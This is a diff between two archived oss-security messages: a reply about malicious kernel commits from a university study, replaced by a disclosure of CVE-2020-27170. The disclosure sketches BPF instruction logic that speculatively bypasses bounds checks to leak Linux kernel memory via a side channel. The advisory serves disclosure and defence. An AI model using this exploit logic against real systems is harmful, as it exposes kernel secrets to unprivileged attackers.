@@ -1,41 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/04/22/14
-Message-ID: <CAFvHPjvbJiaq6Jt_U9ybSBbwzD1JDVTiq5SeAJscU2NQyfJUdw@mail.gmail.com>
-Date: Thu, 22 Apr 2021 14:09:19 -0400
-From: Francis Booth <influencedchaos@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/24/4
+Message-ID: <CAFzhf4rREUjn4=Z45GBxvo4CAvf5=xPEiu3O0rpnWF3hR-7AxQ@mail.gmail.com>
+Date: Wed, 24 Mar 2021 19:34:50 +0000
+From: Piotr Krysiuk <piotras@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Malicious commits to Linux kernel as part of university study
+Subject: Re: [CVE-2020-27170] Protection against speculatively out-of-bounds loads in the Linux kernel can be bypassed by unprivileged local users to leak content of kernel memory
 Content-Type: text/plain; charset=utf-8
 
-Mark,
+Some details of how CVE-2020-27170 could be exploited in practice were
+provided via linux-distros mailing list with 7 days embargo. This was
+intended to help any affected Linux distributions to assess the risk
+and decide about any appropriate actions.
 
->From my understanding from the LKML there were at least 3 patches submitted
-by Aditya which did manage to make it into the stable trees.
+As the embargo expires today, I was asked to share these details
+publically on oss-security.
 
-https://lore.kernel.org/linux-nfs/CADVatmNgU7t-Co84tSS6VW=3NcPu=17qyVyEEtVMVR_g51Ma6Q@mail.gmail.com/
+The CVE-2020-27170 vulnerability has been successfully reproduced
+against Linux kernel v5.12-rc3 using the following logic for BPF
+program attached to a socket:
 
-So I think we can agree that there may be more submissions that have made
-it through that we aren't yet aware of.
+    load bpf_context pointer (BPF_REG_1) into BPF_REG_CTX,
+    load pointer to our big array into BPF_REG_MAP_PTR,
+    load offset of data to leak into BPF_REG_OFFSET,
 
+    // load any slowly-loaded value...
+    BPF_LDX_MEM(BPF_DW, BPF_REG_SLOW_CHECK, BPF_REG_MAP_PTR, 0x1200),
 
-On Thu, Apr 22, 2021 at 1:58 PM Mark Steward <marksteward@...il.com> wrote:
+    // ... and turn it into known zero for verifier,
+    // while preserving slowly-loaded dependency for affected hardware
+    BPF_ALU64_IMM(BPF_AND, BPF_REG_SLOW_CHECK, 1),
+    BPF_ALU64_IMM(BPF_AND, BPF_REG_SLOW_CHECK, 2),
 
-> On Thu, Apr 22, 2021 at 6:23 PM Ariadne Conill <ariadne@...eferenced.org>
-> wrote:
-> ...
-> > By mining the LKML archive, it may be possible to find the original set
-> of
-> > patch submissions by searching for similar keywords as the messages from
-> > Aditya.  If somebody can do that, then we would be able to determine at
-> > least some of the emails likely to have originated the patches.
-> >
->
-> This looks like a good guess to me, and if correct, means none of the
-> submissions in the paper were successful:
->
->   https://lore.kernel.org/linux-nfs/YIEqt8iAPVq8sG+t@sol.localdomain/
->
->
-> Mark
->
+    // speculatively bypassed offset check
+    BPF_JMP_REG(BPF_JNE, BPF_REG_OFFSET, BPF_REG_SLOW_CHECK,
+                skip_speculation),
 
+    // speculatively unbounded pointer arithmetic
+    BPF_ALU64_REG(BPF_ADD, BPF_REG_CTX, BPF_REG_OFFSET),
+
+    // speculatively unbounded load
+    BPF_LDX_MEM(BPF_W, BPF_REG_LEAKED_WORD, BPF_REG_CTX,
+                offsetof(struct __sk_buff, protocol)),
+
+    transmit speculatively loaded BPF_REG_LEAKED_WORD via side-channel,
+
+The full reproducers were shared with a number of Linux distributions
+for protection purposes.
